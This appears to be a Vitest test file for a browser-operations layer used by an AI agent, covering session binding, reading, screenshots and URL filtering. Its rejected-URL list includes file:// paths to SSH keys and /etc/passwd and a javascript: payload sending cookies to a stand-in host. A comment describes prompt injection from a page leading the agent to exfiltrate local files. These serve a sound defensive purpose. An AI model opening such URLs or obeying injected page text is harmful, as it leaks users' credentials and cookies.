import { describe, expect, it } from "vitest";
import type { RunArgs, RunResult } from "./engine.js";
import {
  createOperations,
  MAX_OUTPUT_CHARS,
  MAX_SCREENSHOT_BYTES,
} from "./operations.js";

type Runner = (args: RunArgs) => Promise<RunResult>;

function opsWith(run: Runner | string = "ok") {
  const runs: RunArgs[] = [];
  const stdout = typeof run === "string" ? run : undefined;
  const engine = {
    run: async (args: RunArgs) => {
      runs.push(args);
      return typeof run === "string"
        ? { stdout, stderr: "", code: 0 } as RunResult
        : run(args);
    },
    browserCdpUrl: async () => "ws://127.0.0.1:1/devtools/browser/x",
    shutdown: async () => {},
    shutdownAll: async () => {},
  };
  const closed: string[] = [];
  const pages = {
    pageUrlFor: async () => "ws://127.0.0.1:1/devtools/page/p1",
    existingPageUrl: async () => null,
    existingPageInfo: async () => null,
    closePage: async (sessionKey: string) => {
      closed.push(sessionKey);
    },
    forget: async () => {},
  };
  return {
    runs,
    closed,
    get calls() {
      return runs.map((args) => args.argv);
    },
    operations: createOperations({
      engine,
      pages,
      profileFor: async () => "main",
    }),
  };
}

describe("operations", () => {
  it("binds the session to its own page before acting", async () => {
    const ops = opsWith();
    await ops.operations.open("thr_a", "https://example.com");
    expect(ops.calls[0]).toEqual(["connect", "ws://127.0.0.1:1/devtools/page/p1"]);
    expect(ops.calls[1]).toEqual(["open", "https://example.com"]);
  });

  // A thread session that passes --profile makes Chromium abort on the
  // profile directory another process already holds ("Failed to create a
  // ProcessSingleton for your profile directory"), killing the session for
  // every later command. Measured against agent-browser 0.33.2. Launch mode
  // belongs to the control session alone, so BOTH the bind and the command
  // that follows it must attach.
  it("never launches a browser from a thread session", async () => {
    const ops = opsWith();
    await ops.operations.type("thr_a", "#q", "hello", true);
    expect(ops.runs.length).toBeGreaterThan(1);
    for (const args of ops.runs) expect(args.attach).toBe(true);
  });

  it("passes the resolved profile and session to every run", async () => {
    const ops = opsWith();
    await ops.operations.read("thr_a");
    for (const args of ops.runs) {
      expect(args.profile).toBe("main");
      expect(args.session).toBe("thr_a");
    }
  });

  it("reads page text", async () => {
    const ops = opsWith("Example Domain");
    const text = await ops.operations.read("thr_a");
    expect(ops.calls[1]).toEqual(["read", "--max-output", String(MAX_OUTPUT_CHARS)]);
    expect(text).toBe("Example Domain");
  });

  it("asks for an interactive snapshot when requested", async () => {
    const ops = opsWith();
    await ops.operations.snapshot("thr_a", true);
    expect(ops.calls[1]).toEqual(["snapshot", "-i", "--max-output", String(MAX_OUTPUT_CHARS)]);
  });

  it("asks for the full snapshot when not", async () => {
    const ops = opsWith();
    await ops.operations.snapshot("thr_a", false);
    expect(ops.calls[1]).toEqual(["snapshot", "--max-output", String(MAX_OUTPUT_CHARS)]);
  });

  it("types and submits in one call", async () => {
    const ops = opsWith();
    await ops.operations.type("thr_a", "#q", "hello", true);
    expect(ops.calls[1]).toEqual(["fill", "#q", "hello"]);
    expect(ops.calls[3]).toEqual(["press", "Enter"]);
  });

  it("does not press Enter when submit is false", async () => {
    const ops = opsWith();
    await ops.operations.type("thr_a", "#q", "hello", false);
    expect(ops.calls.map((argv) => argv[0])).not.toContain("press");
  });

  it("returns a screenshot as base64", async () => {
    // The fake writes the PNG the real binary would write, so the read-back
    // path is exercised rather than stubbed.
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47]);
    const ops = opsWith(async ({ argv }) => {
      if (argv[0] === "screenshot") {
        await import("node:fs/promises").then((fs) => fs.writeFile(argv[1], png));
      }
      return { stdout: "ok", stderr: "", code: 0 };
    });
    const shot = await ops.operations.screenshot("thr_a");
    expect(typeof shot.base64).toBe("string");
    expect(shot.base64).toBe(png.toString("base64"));
  });

  it("cleans up the screenshot temp file even when the command fails", async () => {
    let path = "";
    const ops = opsWith(async ({ argv }) => {
      if (argv[0] === "screenshot") {
        path = argv[1];
        return { stdout: "", stderr: "screenshot failed", code: 1 };
      }
      return { stdout: "ok", stderr: "", code: 0 };
    });
    await expect(ops.operations.screenshot("thr_a")).rejects.toThrow(/screenshot failed/);
    const { existsSync } = await import("node:fs");
    expect(existsSync(path)).toBe(false);
  });

  it("closes this thread's page without touching the browser", async () => {
    const ops = opsWith();
    await ops.operations.close("thr_a");
    expect(ops.closed).toEqual(["thr_a"]);
    expect(ops.calls).toEqual([]);
  });

  it("surfaces a failing command as an error", async () => {
    const ops = opsWith(async ({ argv }) =>
      argv[0] === "connect"
        ? { stdout: "", stderr: "", code: 0 }
        : { stdout: "", stderr: "no such element", code: 1 },
    );
    await expect(ops.operations.click("thr_a", "#gone")).rejects.toThrow(/no such element/);
  });

  // file:// + read is a local-file exfiltration path, reachable by injection
  // from any page the agent is already reading. javascript:/data: execute
  // attacker-authored script in the tab's origin. Enforced in Operations so
  // the CLI inherits it rather than re-implementing it.
  describe("refuses to open anything that is not http or https", () => {
    const rejected = [
      "file:///Users/mgrin/.ssh/id_rsa",
      "file:///etc/passwd",
      "javascript:fetch('https://evil.test/'+document.cookie)",
      "data:text/html,<script>alert(1)</script>",
      "about:blank",
      "chrome://settings",
      "view-source:https://example.com",
      "ftp://example.com/secret.txt",
      "ws://127.0.0.1:9222/devtools/browser/abc",
      "blob:https://example.com/1234",
    ];

    for (const url of rejected) {
      it(`rejects ${url}`, async () => {
        const ops = opsWith();
        await expect(ops.operations.open("thr_a", url)).rejects.toThrow(/only opens http/i);
        // and never reached the browser at all
        expect(ops.calls).toEqual([]);
      });
    }

    it("rejects a string that is not a url", async () => {
      const ops = opsWith();
      await expect(ops.operations.open("thr_a", "not a url")).rejects.toThrow(/not a valid url/i);
      expect(ops.calls).toEqual([]);
    });

    for (const url of ["https://example.com/", "http://localhost:3000/x?y=1#z"]) {
      it(`still opens ${url}`, async () => {
        const ops = opsWith();
        await ops.operations.open("thr_a", url);
        expect(ops.calls[1]).toEqual(["open", url]);
      });
    }
  });

  it("refuses a screenshot larger than the byte cap", async () => {
    const huge = Buffer.alloc(MAX_SCREENSHOT_BYTES + 1, 0x41);
    const ops = opsWith(async ({ argv }) => {
      if (argv[0] === "screenshot") {
        await import("node:fs/promises").then((fs) => fs.writeFile(argv[1], huge));
      }
      return { stdout: "ok", stderr: "", code: 0 };
    });
    await expect(ops.operations.screenshot("thr_a")).rejects.toThrow(/over the .*-byte limit/);
  });

  it("does not cap commands whose output the page does not control", async () => {
    const ops = opsWith();
    await ops.operations.click("thr_a", "#go");
    expect(ops.calls[1]).toEqual(["click", "#go"]);
  });

  it("says so when the bind itself fails", async () => {
    const ops = opsWith(async ({ argv }) =>
      argv[0] === "connect"
        ? { stdout: "", stderr: "connect refused", code: 1 }
        : { stdout: "ok", stderr: "", code: 0 },
    );
    await expect(ops.operations.read("thr_a")).rejects.toThrow(/bind.*connect refused/s);
  });
});
